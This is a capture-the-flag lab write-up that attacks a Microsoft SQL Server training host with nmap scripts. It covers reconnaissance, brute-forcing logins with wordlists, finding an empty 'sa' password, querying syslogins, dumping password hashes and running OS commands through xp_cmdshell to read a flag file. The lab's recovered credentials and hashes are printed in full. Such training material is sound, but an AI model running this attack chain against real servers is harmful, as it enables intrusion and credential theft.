### SQL3

Objective: 
1. Identify MSSQL Database Server
2. Find information from the MSSQL server with NTLM.
3. Enumerate all valid MSSQL users and passwords
4. Identify 'sa' user password
5. Execute MSSQL query to extract sysusers
6. Dump MSSQL users hashes
7. Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)

[[ping]]

```
root@attackdefense:~# ping -c 5 10.5.30.230
PING 10.5.30.230 (10.5.30.230) 56(84) bytes of data.
64 bytes from 10.5.30.230: icmp_seq=1 ttl=125 time=2.86 ms
64 bytes from 10.5.30.230: icmp_seq=2 ttl=125 time=2.08 ms
64 bytes from 10.5.30.230: icmp_seq=3 ttl=125 time=1.97 ms
64 bytes from 10.5.30.230: icmp_seq=4 ttl=125 time=1.93 ms
64 bytes from 10.5.30.230: icmp_seq=5 ttl=125 time=1.96 ms

--- 10.5.30.230 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 1.934/2.161/2.861/0.353 ms
```

[[Hack2.0/NMAP|NMAP]]

```
root@attackdefense:~# nmap -T4 -A 10.5.30.230
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 16:21 IST
Nmap scan report for 10.5.30.230
Host is up (0.0016s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-07-11T10:48:47
|_Not valid after:  2053-07-11T10:48:47
|_ssl-date: 2023-07-11T10:51:59+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|   Product_Version: 10.0.14393
|_  System_Time: 2023-07-11T10:51:51+00:00
| ssl-cert: Subject: commonName=MSSQL-Server
| Not valid before: 2023-07-10T10:48:42
|_Not valid after:  2024-01-09T10:48:42
|_ssl-date: 2023-07-11T10:51:59+00:00; 0s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/11%OT=135%CT=1%CU=35466%PV=Y%DS=3%DC=T%G=Y%TM=64AD34
OS:4F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS
OS:=A)OPS(O1=M546NW8ST11%O2=M546NW8ST11%O3=M546NW8NNT11%O4=M546NW8ST11%O5=M
OS:546NW8ST11%O6=M546ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=7F%W=2000%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=7F%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=7F%CD=Z)

Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.5.30.230:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-11T10:51:53
|_  start_date: 2023-07-11T10:48:42

TRACEROUTE (using port 554/tcp)
HOP RTT     ADDRESS
1   0.02 ms linux (10.10.19.1)
2   ...
3   1.69 ms 10.5.30.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.40 seconds
```

```
root@attackdefense:~# nmap -p1433 --script ms-sql-info 10.5.30.230
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 16:24 IST
Nmap scan report for 10.5.30.230
Host is up (0.0017s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.5.30.230:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

```
root@attackdefense:~# nmap -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.5.30.230
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 16:26 IST
Nmap scan report for 10.5.30.230
Host is up (0.0019s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```

```
root@attackdefense:~# nmap -p1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.5.30.230
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 16:31 IST
Nmap scan report for 10.5.30.230
Host is up (0.0019s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-brute: 
|   [10.5.30.230:1433]
|     Credentials found:
|       auditor:jasmine1 => Login Success
|       admin:anamaria => Login Success
|_      dbadmin:bubbles1 => Login Success

Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds
```

```
root@attackdefense:~# nmap -p1433 --script ms-sql-empty-password 10.5.30.230
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 16:33 IST
Nmap scan report for 10.5.30.230
Host is up (0.0019s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-empty-password: 
|   [10.5.30.230:1433]
|_    sa:<empty> => Login Success

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

```
# Nmap 7.91 scan initiated Tue Jul 11 16:37:31 2023 as: nmap -p1433 --script ms-sql-query --script-args "mssql.username=admin,mssql.password=anamaria,ms-sql-query.query=select * from master..syslogins;" -oN output.txt 10.5.30.230
Nmap scan report for 10.5.30.230
Host is up (0.0017s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-query: 
|   [10.5.30.230:1433]
|     Query: select * from master..syslogins;
|       sid	status	createdate	updatedate	accdate	totcpu	totio	spacelimit	timelimit	resultlimit	name	dbname	password	language	denylogin	hasaccess	isntname	isntgroup	isntuser	sysadmin	securityadmin	serveradmin	setupadmin	processadmin	diskadmin	dbcreator	bulkadmin	loginname
|       ===	======	==========	==========	=======	======	=====	==========	=========	===========	====	======	========	========	=========	=========	========	=========	========	========	=============	===========	==========	============	=========	=========	=========	=========
|       0x01	9	2003-04-08T03:40:35	2021-01-21T04:50:57	2003-04-08T03:40:35	0	0	0	0	0	sa	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	sa
|       0x0106000000000009010000001e501960278b270fd34191426bf0193fc0b4e786	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLResourceSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLResourceSigningCertificate##
|       0x010600000000000901000000ed1b6318a0592d96ce6d143a9184be0f758287be	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLReplicationSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLReplicationSigningCertificate##
|       0x010600000000000901000000fb236d83a8dc8e7de549c56382c1a25f85ea3704	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLAuthenticatorCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLAuthenticatorCertificate##
|       0x010600000000000901000000bb1b6130e13e5b67b7bd49ce40730a5b67188088	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_PolicySigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicySigningCertificate##
|       0x010600000000000901000000dcfdce5b748d5515e793fc84e1eccbe22a187f7a	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SmoExtendedSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SmoExtendedSigningCertificate##
|       0x5681cce7a1f1ff41b2f95ced7d792e70	9	2019-09-24T08:51:53	2021-01-20T01:47:08	2019-09-24T08:51:53	0	0	0	0	0	##MS_PolicyEventProcessingLogin##	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicyEventProcessingLogin##
|       0x27578d8516843e4094efa2ceed085c82	9	2019-09-24T08:51:53	2021-01-20T01:47:08	2019-09-24T08:51:53	0	0	0	0	0	##MS_PolicyTsqlExecutionLogin##	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicyTsqlExecutionLogin##
|       0x0106000000000009010000004c1967c27feb2ead332894c5a0779eae202847c8	9	2019-09-24T08:51:58	2019-09-24T08:51:58	2019-09-24T08:51:58	0	0	0	0	0	##MS_AgentSigningCertificate##	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	##MS_AgentSigningCertificate##
|       0x010500000000000515000000cf4b5eb619bca0ed968e21eff4010000	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	EC2AMAZ-5861GL6\Administrator	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	EC2AMAZ-5861GL6\Administrator
|       0x010600000000000550000000732b9753646ef90356745cb675c3aa6cd6b4d28b	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT SERVICE\SQLWriter	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT SERVICE\SQLWriter
|       0x0106000000000005500000005a048ddff9c7430ab450d4e7477a2172ab4170f4	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT SERVICE\Winmgmt	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT SERVICE\Winmgmt
|       0x010600000000000550000000703344e71d40b7ffb8844562a9e3c7d4fd9771d8	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT Service\MSSQL$SQLEXPRESS	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT Service\MSSQL$SQLEXPRESS
|       0x01020000000000052000000021020000	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	BUILTIN\Users	master	Null	us_english	0	1	1	1	0	0	0	0	0	0	0	0	0	BUILTIN\Users
|       0x010100000000000512000000	9	2021-01-20T01:47:08	2021-01-20T02:50:35	2021-01-20T01:47:08	0	0	0	0	0	NT AUTHORITY\SYSTEM	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT AUTHORITY\SYSTEM
|       0x0106000000000005500000002c4559766def9a2f8e23ea83ae7c7f71254cb2cc	9	2021-01-20T01:47:09	2021-01-20T01:47:09	2021-01-20T01:47:09	0	0	0	0	0	NT SERVICE\SQLTELEMETRY$SQLEXPRESS	master	Null	us_english	0	1	1	0	1	0	0	0	0	0	0	0	0	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
|       0x4a84b80919150844b881d1c2fead7f03	9	2021-01-20T02:48:23	2021-01-20T02:48:23	2021-01-20T02:48:23	0	0	0	0	0	admin	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	admin
|       0xc923586600ca1d40a00bcea3f83cf029	9	2021-01-20T02:50:33	2021-01-20T02:50:36	2021-01-20T02:50:33	0	0	0	0	0	Mssql	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	Mssql
|       0xdab05f73c5a136409081bc4dd4bb1173	9	2021-01-20T03:01:26	2021-01-20T03:15:57	2021-01-20T03:01:26	0	0	0	0	0	Mssqla	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	Mssqla
|       0x09f200d8751d4040b72ae7bd09a43fe0	9	2021-01-20T03:31:14	2021-01-20T03:31:14	2021-01-20T03:31:14	0	0	0	0	0	auditor	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	auditor
|_      0x1f80eace64083c4598d9fc5c34060c84	9	2021-01-20T03:31:47	2021-01-20T03:31:47	2021-01-20T03:31:47	0	0	0	0	0	dbadmin	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	dbadmin

# Nmap done at Tue Jul 11 16:37:31 2023 -- 1 IP address (1 host up) scanned in 0.40 seconds
```

```
root@attackdefense:~# nmap -p1433 10.5.30.230 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 17:01 IST
Nmap scan report for 10.5.30.230
Host is up (0.0024s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-dump-hashes: 
| [10.5.30.230:1433]
|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

you will see a different target IP address due to lab reset

```
root@attackdefense:~# nmap -p 1433 10.5.22.81 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd='ipconfig'
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 21:45 IST
Nmap scan report for 10.5.22.81
Host is up (0.0022s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-xp-cmdshell: 
|   [10.5.22.81:1433]
|     Command: ipconfig
|       output
|       ======
|       Null
|       Windows IP Configuration
|       Null
|       Null
|       Ethernet adapter Ethernet:
|       Null
|          Connection-specific DNS Suffix  . : ap-south-1.compute.internal
|          Link-local IPv6 Address . . . . . : fe80::31ec:c23c:2362:7e2e%3
|          IPv4 Address. . . . . . . . . . . : 10.5.22.81
|          Subnet Mask . . . . . . . . . . . : 255.255.240.0
|          Default Gateway . . . . . . . . . : 10.5.16.1
|       Null
|       Tunnel adapter isatap.ap-south-1.compute.internal:
|       Null
|          Media State . . . . . . . . . . . : Media disconnected
|          Connection-specific DNS Suffix  . : ap-south-1.compute.internal
|       Null
|       Tunnel adapter Local Area Connection* 3:
|       Null
|          Connection-specific DNS Suffix  . : 
|          IPv6 Address. . . . . . . . . . . : 2001:0:348b:fb58:2493:3ecb:f5fa:e9ae
|          Link-local IPv6 Address . . . . . : fe80::2493:3ecb:f5fa:e9ae%6
|          Default Gateway . . . . . . . . . : ::
|_      Null

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

```
root@attackdefense:~# nmap -p 1433 10.5.22.81 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd='type c:\flag.txt'
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 21:46 IST
Nmap scan report for 10.5.22.81
Host is up (0.0017s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-xp-cmdshell: 
|   [10.5.22.81:1433]
|     Command: type c:\flag.txt
|       output
|       ======
|_      1d1803570245aa620446518b2154f324

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

